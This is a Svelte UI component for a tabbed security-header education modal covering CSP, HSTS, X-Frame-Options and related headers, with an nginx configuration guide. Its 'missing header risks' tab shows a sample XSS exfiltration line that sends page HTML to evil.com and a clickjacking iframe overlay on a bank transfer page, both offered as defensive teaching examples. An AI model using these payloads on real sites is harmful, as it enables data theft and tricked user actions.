<script lang="ts">
    import { X, FileLock2, AlertCircle, ShieldCheck, ArrowRight, ChevronRight, ChevronLeft } from 'lucide-svelte';
    import { fade, fly } from 'svelte/transition';
    import { backOut } from 'svelte/easing';

    let { isOpen = $bindable(false) } = $props<{ isOpen: boolean }>();

    function close() {
        isOpen = false;
    }

    let activeTab = $state(0);
    const tabs = [
        { id: 0, label: "1. Header Inventory", icon: FileLock2 },
        { id: 1, label: "2. Missing Header Risks", icon: AlertCircle },
        { id: 2, label: "3. Implementation Guide", icon: ShieldCheck }
    ];

    function nextTab() {
        if (activeTab < tabs.length - 1) activeTab++;
    }
    function prevTab() {
        if (activeTab > 0) activeTab--;
    }
</script>

{#if isOpen}
    <!-- svelte-ignore a11y_click_events_have_key_events, a11y_no_static_element_interactions -->
    <div
        class="fixed inset-0 z-60 flex items-center justify-center p-4 sm:p-6 bg-overlay backdrop-blur-md"
        transition:fade={{ duration: 200 }}
        onclick={close}
    >
        <div
            class="bg-[#0A0C10] border border-orange-500/20 rounded-2xl w-full max-w-4xl overflow-hidden shadow-[0_0_50px_-12px_rgba(249,115,22,0.15)] relative flex flex-col max-h-[90vh]"
            transition:fly={{ y: 20, duration: 400, easing: backOut }}
            onclick={(e) => e.stopPropagation()}
        >
            <!-- Header Area -->
            <div class="relative bg-linear-to-r from-orange-950/40 via-orange-900/10 to-transparent p-6 border-b border-orange-500/10 shrink-0">
                <div class="absolute -right-20 -top-20 w-64 h-64 bg-orange-500/10 blur-3xl rounded-full pointer-events-none"></div>
                <button
                    onclick={close}
                    class="absolute top-4 right-4 p-2 text-muted hover:text-primary-text bg-glass hover:bg-orange-500/20 rounded-xl transition-all border border-subtle hover:border-orange-500/30 font-medium"
                    aria-label="Close guide modal"
                >
                    <X size={18} />
                </button>

                <div class="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4 relative z-10">
                    <div class="flex items-center gap-4">
                        <div class="w-14 h-14 rounded-2xl bg-linear-to-br from-orange-500/20 to-orange-600/10 flex items-center justify-center border border-orange-500/30 shadow-inner">
                            <FileLock2 size={28} class="text-orange-400" />
                        </div>
                        <div>
                            <h2 class="text-2xl font-bold tracking-tight text-primary-text">Security Headers Analysis</h2>
                            <p class="text-sm text-muted mt-1 max-w-md">HTTP response header audit for browser-enforced security policy enforcement directives.</p>
                        </div>
                    </div>

                    <!-- Tab Navigation -->
                    <div class="flex bg-glass p-1 rounded-lg border border-subtle mt-4 sm:mt-0">
                        {#each tabs as tab (tab.id)}
                            <button
                                onclick={() => activeTab = tab.id}
                                class="flex items-center gap-2 px-3 py-1.5 rounded-md text-sm font-medium transition-all {activeTab === tab.id ? 'bg-orange-500/20 text-orange-300 border border-orange-500/20 shadow-sm' : 'text-muted hover:text-primary-text hover:bg-glass border border-transparent'}"
                            >
                                <tab.icon size={14} />
                                <span class="hidden sm:inline">{tab.label}</span>
                            </button>
                        {/each}
                    </div>
                </div>
            </div>

            <!-- Content Area - Scrollable -->
            <div class="flex-1 overflow-y-auto p-6 relative custom-scrollbar">
                {#if activeTab === 0}
                    <div transition:fade={{ duration: 200 }}>
                        <h3 class="text-lg font-semibold text-orange-300 mb-4">Security Header Reference</h3>
                        <p class="text-sm text-muted mb-6 max-w-3xl">
                            HTTP security headers are instructions your server sends to the browser, telling it how to behave when loading and rendering your page. They are enforced by the browser — not your code — making them a powerful and reliable defense layer that requires only server configuration changes.
                        </p>

                        <div class="space-y-3">
                            {#each [
                                {
                                    name: "Content-Security-Policy",
                                    abbr: "CSP",
                                    color: "red",
                                    importance: "Critical",
                                    example: "default-src 'self'; script-src 'self' https://cdn.example.com; object-src 'none'",
                                    attack: "XSS & Data Injection",
                                    desc: "Defines an allowlist of sources for scripts, styles, images, frames, and other resources. When a script injection occurs (XSS), CSP prevents the injected script from loading or exfiltrating data to unauthorized domains."
                                },
                                {
                                    name: "Strict-Transport-Security",
                                    abbr: "HSTS",
                                    color: "red",
                                    importance: "Critical",
                                    example: "max-age=31536000; includeSubDomains; preload",
                                    attack: "SSL Stripping / MitM",
                                    desc: "Instructs browsers to always use HTTPS for this domain for the specified duration. Once seen, the browser will refuse to connect over HTTP — preventing SSL stripping attacks where a network attacker downgrades your connection to plaintext."
                                },
                                {
                                    name: "X-Frame-Options",
                                    abbr: "XFO",
                                    color: "orange",
                                    importance: "High",
                                    example: "DENY",
                                    attack: "Clickjacking",
                                    desc: "Controls whether this page can be loaded inside an iframe. DENY prevents any framing. SAMEORIGIN only allows same-domain frames. Without it, attackers can overlay your page inside a transparent iframe and trick users into clicking hidden buttons."
                                },
                                {
                                    name: "X-Content-Type-Options",
                                    abbr: "XCTO",
                                    color: "orange",
                                    importance: "High",
                                    example: "nosniff",
                                    attack: "MIME Sniffing",
                                    desc: "Prevents browsers from MIME-type sniffing — guessing a file's type from its content rather than the declared Content-Type. Without this, an attacker who uploads a text file that looks like JavaScript could trick the browser into executing it as a script."
                                },
                                {
                                    name: "Referrer-Policy",
                                    abbr: "RP",
                                    color: "yellow",
                                    importance: "Medium",
                                    example: "strict-origin-when-cross-origin",
                                    attack: "Information Leakage",
                                    desc: "Controls what URL information is sent in the Referer header when navigating to other sites. Without restriction, users clicking links from your authenticated pages leak full URLs (including query params like tokens or IDs) to external servers."
                                },
                                {
                                    name: "Permissions-Policy",
                                    abbr: "PP",
                                    color: "yellow",
                                    importance: "Medium",
                                    example: "geolocation=(), microphone=(), camera=()",
                                    attack: "Feature Abuse",
                                    desc: "Restricts which browser APIs this page and its embedded frames can use. Prevents malicious embedded scripts from accessing the camera, microphone, geolocation, or payment APIs — even if XSS occurs and an attacker gains JS execution."
                                }
                            ] as header}
                                <div class="p-4 bg-orange-950/20 border border-orange-500/10 rounded-xl hover:border-orange-500/30 transition-colors">
                                    <div class="flex items-start justify-between gap-3 mb-2">
                                        <div class="flex items-center gap-2">
                                            <code class="text-xs font-mono font-bold text-primary-text">{header.name}</code>
                                            <span class="text-[9px] font-bold uppercase tracking-wider px-1.5 py-0.5 rounded border {
                                                header.color === 'red' ? 'text-red-400 border-red-500/30 bg-red-500/10' :
                                                header.color === 'orange' ? 'text-orange-400 border-orange-500/30 bg-orange-500/10' :
                                                'text-yellow-400 border-yellow-500/30 bg-yellow-500/10'
                                            }">{header.importance}</span>
                                        </div>
                                        <span class="text-[10px] text-muted shrink-0">Prevents: <span class="text-orange-300">{header.attack}</span></span>
                                    </div>
                                    <p class="text-xs text-muted leading-relaxed mb-2">{header.desc}</p>
                                    <code class="text-[10px] font-mono text-cyan-300 bg-surface/80 px-2 py-1 rounded border border-subtle block truncate">{header.name}: {header.example}</code>
                                </div>
                            {/each}
                        </div>
                    </div>
                {:else if activeTab === 1}
                    <div transition:fade={{ duration: 200 }}>
                        <h3 class="text-lg font-semibold text-orange-300 mb-4">Specific Attacks from Missing Headers</h3>
                        <p class="text-sm text-muted mb-6 max-w-3xl">
                            Each missing security header enables a specific, well-documented attack class. Understanding the exact exploit path helps prioritize which headers to add first.
                        </p>

                        <div class="space-y-5">
                            <!-- No CSP → XSS -->
                            <div class="p-5 border border-red-500/20 bg-red-950/10 rounded-xl">
                                <h4 class="text-sm font-semibold text-red-300 mb-2 flex items-center gap-2">
                                    <AlertCircle size={14}/> No CSP → XSS Data Exfiltration
                                </h4>
                                <p class="text-xs text-muted mb-3 leading-relaxed">Without CSP, an injected script can load external resources and send stolen data anywhere. The payload below would silently exfiltrate the current page's HTML (which may contain CSRF tokens, PII, or auth tokens) to an attacker-controlled server:</p>
                                <div class="bg-[#0d1117] rounded-lg p-3 font-mono text-[11px] border border-red-500/20 space-y-1">
                                    <div class="text-muted">// Injected via XSS — no CSP to block it</div>
                                    <div class="text-red-300">fetch('https://evil.com/steal?data=' + btoa(document.body.innerHTML))</div>
                                    <div class="text-red-400 text-[10px] mt-1">// CSP: default-src 'self' would block the fetch to evil.com</div>
                                </div>
                            </div>

                            <!-- No X-Frame-Options → Clickjacking -->
                            <div class="p-5 border border-orange-500/20 bg-orange-950/10 rounded-xl">
                                <h4 class="text-sm font-semibold text-orange-300 mb-2 flex items-center gap-2">
                                    <AlertCircle size={14}/> No X-Frame-Options → Clickjacking
                                </h4>
                                <p class="text-xs text-muted mb-3 leading-relaxed">An attacker embeds your login page in a transparent iframe over a fake page. When the user thinks they're clicking a "Win a Prize" button, they're actually clicking your "Transfer Funds" button underneath:</p>
                                <div class="bg-[#0d1117] rounded-lg p-3 font-mono text-[11px] border border-orange-500/20 space-y-1">
                                    <div class="text-muted">&lt;!-- Attacker's page --&gt;</div>
                                    <div class="text-orange-300">&lt;div style="position:relative"&gt;</div>
                                    <div class="text-orange-300 ml-4">&lt;iframe src="https://bank.com/transfer" style="opacity:0; position:absolute; z-index:2"&gt;&lt;/iframe&gt;</div>
                                    <div class="text-orange-300 ml-4">&lt;button style="z-index:1"&gt;Click to claim prize!&lt;/button&gt;</div>
                                    <div class="text-orange-300">&lt;/div&gt;</div>
                                    <div class="text-red-400 text-[10px] mt-1">// User clicks the visible button but triggers the hidden iframe action</div>
                                </div>
                            </div>

                            <!-- No HSTS → SSL Stripping -->
                            <div class="p-5 border border-orange-500/20 bg-orange-950/10 rounded-xl">
                                <h4 class="text-sm font-semibold text-orange-300 mb-2 flex items-center gap-2">
                                    <AlertCircle size={14}/> No HSTS → SSL Stripping MitM
                                </h4>
                                <p class="text-xs text-muted mb-3 leading-relaxed">A network attacker (on the same WiFi or a BGP hijack) intercepts the initial HTTP request (before the redirect to HTTPS) and forwards a downgraded plaintext connection. The victim sees no browser warning and all their traffic is visible in cleartext:</p>
                                <div class="bg-[#0d1117] rounded-lg p-3 font-mono text-[11px] border border-orange-500/20 space-y-1">
                                    <div class="text-muted">Victim types: bank.com → browser tries http://bank.com first</div>
                                    <div class="text-muted">Attacker intercepts → strips TLS → keeps victim on HTTP</div>
                                    <div class="text-muted">Victim sees: http://bank.com (green-ish, no lock icon, no alarm)</div>
                                    <div class="text-red-400">Attacker sees: ALL plaintext including passwords</div>
                                    <div class="text-emerald-400 mt-1">HSTS fix: browser remembers "always HTTPS" after first secure visit</div>
                                </div>
                            </div>

                            <!-- No XCTO → MIME Confusion -->
                            <div class="p-5 border border-yellow-500/20 bg-yellow-950/10 rounded-xl">
                                <h4 class="text-sm font-semibold text-yellow-300 mb-2 flex items-center gap-2">
                                    <AlertCircle size={14}/> No X-Content-Type-Options → Drive-by Download / Script Execution
                                </h4>
                                <p class="text-xs text-muted leading-relaxed">An attacker uploads a file named <code class="text-cyan-300">innocent.txt</code> that actually contains JavaScript. Without <code class="text-cyan-300">nosniff</code>, some older browsers "sniff" the file content and execute it as a script. Modern Chrome/Firefox enforce nosniff behavior regardless, but the header is still required for full coverage across all user-agents.</p>
                            </div>
                        </div>
                    </div>
                {:else if activeTab === 2}
                    <div transition:fade={{ duration: 200 }}>
                        <h3 class="text-lg font-semibold text-orange-300 mb-4">Implementation Guide</h3>
                        <p class="text-sm text-muted mb-6 max-w-3xl">
                            All security headers can be added in a single nginx location block. The complete configuration below adds every major security header to all responses. Adapt values for your specific application needs.
                        </p>

                        <!-- Complete nginx Security Headers Config -->
                        <div class="relative bg-[#0d1117] rounded-xl border border-emerald-500/20 overflow-hidden font-mono text-xs mb-6">
                            <div class="absolute top-0 right-0 bg-emerald-500/10 text-emerald-400 px-4 py-1.5 rounded-bl-xl text-xs font-bold border-b border-l border-emerald-500/30 tracking-widest uppercase">Complete nginx Security Headers</div>
                            <div class="p-5 overflow-x-auto pt-10 custom-scrollbar">
                                <pre class="text-primary-text leading-relaxed">
<span class="text-muted"># Add to your server {"{"} {"}"} block in nginx.conf</span>

<span class="text-muted"># Critical headers</span>
<span class="text-cyan-300">add_header</span> Strict-Transport-Security <span class="text-emerald-300">"max-age=31536000; includeSubDomains; preload"</span> always;
<span class="text-cyan-300">add_header</span> Content-Security-Policy <span class="text-emerald-300">"default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'"</span> always;

<span class="text-muted"># High-priority headers</span>
<span class="text-cyan-300">add_header</span> X-Frame-Options <span class="text-emerald-300">"DENY"</span> always;
<span class="text-cyan-300">add_header</span> X-Content-Type-Options <span class="text-emerald-300">"nosniff"</span> always;

<span class="text-muted"># Medium-priority headers</span>
<span class="text-cyan-300">add_header</span> Referrer-Policy <span class="text-emerald-300">"strict-origin-when-cross-origin"</span> always;
<span class="text-cyan-300">add_header</span> Permissions-Policy <span class="text-emerald-300">"geolocation=(), microphone=(), camera=(), payment=()"</span> always;

<span class="text-muted"># Hide server banner</span>
<span class="text-cyan-300">server_tokens</span> <span class="text-red-400">off</span>;</pre>
                            </div>
                        </div>

                        <!-- CSP Construction Guide -->
                        <div class="p-4 bg-orange-950/20 border border-orange-500/10 rounded-xl mb-4">
                            <h4 class="text-sm font-semibold text-orange-300 mb-3">Building a Content-Security-Policy</h4>
                            <p class="text-xs text-muted mb-3 leading-relaxed">CSP construction requires knowing what resources your app loads. Start strict and relax only what breaks:</p>
                            <div class="space-y-2 text-xs text-muted">
                                <div class="flex items-start gap-2"><ArrowRight size={12} class="text-orange-500 mt-0.5 shrink-0"/><span><strong class="text-primary-text">Step 1:</strong> Start with <code class="text-cyan-300">default-src 'self'</code> — blocks everything not from your own origin.</span></div>
                                <div class="flex items-start gap-2"><ArrowRight size={12} class="text-orange-500 mt-0.5 shrink-0"/><span><strong class="text-primary-text">Step 2:</strong> Add exceptions as needed: <code class="text-cyan-300">script-src 'self' https://cdn.trusted.com</code></span></div>
                                <div class="flex items-start gap-2"><ArrowRight size={12} class="text-orange-500 mt-0.5 shrink-0"/><span><strong class="text-primary-text">Step 3:</strong> Test first using <code class="text-cyan-300">Content-Security-Policy-Report-Only</code> — reports violations to a URL without blocking. Zero user impact while you iterate.</span></div>
                                <div class="flex items-start gap-2"><ArrowRight size={12} class="text-orange-500 mt-0.5 shrink-0"/><span><strong class="text-primary-text">Step 4:</strong> Switch to enforcing <code class="text-cyan-300">Content-Security-Policy</code> once violations stop.</span></div>
                            </div>
                            <div class="mt-3 bg-[#0d1117] rounded-lg p-3 font-mono text-[11px] border border-subtle">
                                <div class="text-muted"># Report-Only mode — safe to deploy immediately, no blocking</div>
                                <div class="text-cyan-300">Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report</div>
                            </div>
                        </div>

                        <!-- HSTS Preload -->
                        <div class="bg-orange-950/20 border border-orange-500/20 rounded-xl p-4">
                            <h4 class="text-orange-400 font-medium mb-2 text-sm flex items-center gap-2"><ShieldCheck size={14}/> HSTS Preloading Requirements</h4>
                            <p class="text-xs text-muted leading-relaxed mb-2">To submit to the HSTS preload list (hardcoded into Chrome, Firefox, Safari source code), your site must meet all three requirements simultaneously:</p>
                            <ul class="space-y-1 text-xs text-muted">
                                <li class="flex items-center gap-2"><ArrowRight size={11} class="text-orange-400 shrink-0"/><span><code class="text-cyan-300">max-age</code> of at least <strong class="text-primary-text">31536000</strong> (1 year)</span></li>
                                <li class="flex items-center gap-2"><ArrowRight size={11} class="text-orange-400 shrink-0"/><span>Must include <code class="text-cyan-300">includeSubDomains</code> directive</span></li>
                                <li class="flex items-center gap-2"><ArrowRight size={11} class="text-orange-400 shrink-0"/><span>Must include <code class="text-cyan-300">preload</code> directive, then submit at <span class="text-orange-300">hstspreload.org</span></span></li>
                            </ul>
                            <p class="text-xs text-muted mt-2"><strong class="text-red-300">Warning:</strong> Preloading is difficult to reverse — ensure ALL subdomains support HTTPS before enabling includeSubDomains.</p>
                        </div>
                    </div>
                {/if}
            </div>

            <!-- Footer Area -->
            <div class="bg-[#0A0C10] p-4 border-t border-orange-500/10 flex items-center justify-between shrink-0 shadow-[0_-10px_20px_-10px_rgba(0,0,0,0.5)] z-20">
                <div class="text-xs text-muted hidden sm:block">
                    Use <kbd class="px-2 py-1 bg-glass rounded mx-1 text-muted border border-glass font-mono">Esc</kbd> or click outside to dismiss
                </div>
                <div class="flex items-center gap-3 w-full sm:w-auto justify-between sm:justify-end">
                    {#if activeTab > 0}
                        <button
                            onclick={prevTab}
                            class="flex items-center gap-1.5 px-5 py-2.5 bg-glass hover:bg-glass-hover text-primary-text text-sm font-medium rounded-xl border border-subtle hover:border-glass transition-all focus:ring-2 focus:ring-glass outline-none"
                        >
                            <ChevronLeft size={16} /> Previous
                        </button>
                    {:else}
                        <div></div>
                    {/if}

                    {#if activeTab < tabs.length - 1}
                        <button
                            onclick={nextTab}
                            class="flex items-center gap-1.5 px-6 py-2.5 bg-orange-600 hover:bg-orange-500 text-primary-text text-sm font-semibold rounded-xl shadow-[0_0_20px_rgba(249,115,22,0.4)] transition-all transform hover:scale-105 active:scale-95 focus:ring-2 focus:ring-orange-500/50 outline-none"
                        >
                            Continue <ChevronRight size={16} />
                        </button>
                    {:else}
                        <button
                            onclick={close}
                            class="flex items-center gap-1.5 px-8 py-2.5 bg-emerald-500 hover:bg-emerald-400 text-emerald-950 text-sm font-bold rounded-xl shadow-[0_0_20px_rgba(16,185,129,0.4)] transition-all transform hover:scale-105 active:scale-95 focus:ring-2 focus:ring-emerald-500/50 outline-none"
                        >
                            Complete
                        </button>
                    {/if}
                </div>
            </div>
        </div>
    </div>
{/if}

<style>
    .custom-scrollbar::-webkit-scrollbar {
        width: 8px;
        height: 8px;
    }
    .custom-scrollbar::-webkit-scrollbar-track {
        background: transparent;
    }
    .custom-scrollbar::-webkit-scrollbar-thumb {
        background-color: rgba(255, 255, 255, 0.1);
        border-radius: 10px;
    }
    .custom-scrollbar::-webkit-scrollbar-thumb:hover {
        background-color: rgba(255, 255, 255, 0.2);
    }
</style>
